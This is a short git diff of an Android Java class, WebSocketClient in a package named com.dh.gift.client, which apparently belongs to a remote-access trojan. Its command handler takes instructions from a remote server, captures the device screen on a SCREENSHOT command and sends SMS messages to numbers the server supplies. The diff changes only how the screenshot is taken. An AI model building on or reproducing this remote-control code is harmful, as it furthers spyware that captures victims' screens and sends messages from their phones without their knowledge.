@@ -1,5 +1,7 @@
 package com.dh.gift.client;
 
+
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.SurfaceTexture;
@@ -17,6 +19,7 @@ import com.dh.gift.client.functionality.Phone;
 import com.dh.gift.client.functionality.SMS;
 import com.dh.gift.client.functionality.Screenshot;
 import com.dh.gift.client.functionality.Utils;
+import com.dh.gift.client.MainActivity;
 
 import org.java_websocket.handshake.ServerHandshake;
 import org.json.JSONException;
@@ -127,7 +130,8 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case SCREENSHOT:
-                    Screenshot.screenShare(context, mediaProjection);
+                    Activity activity = (Activity) context;
+                    Screenshot.takeScreenshot(mediaProjection,activity);
                     break;
                 case TEXT:
                     SMS.send(req.getString("number"), req.getString("message"));
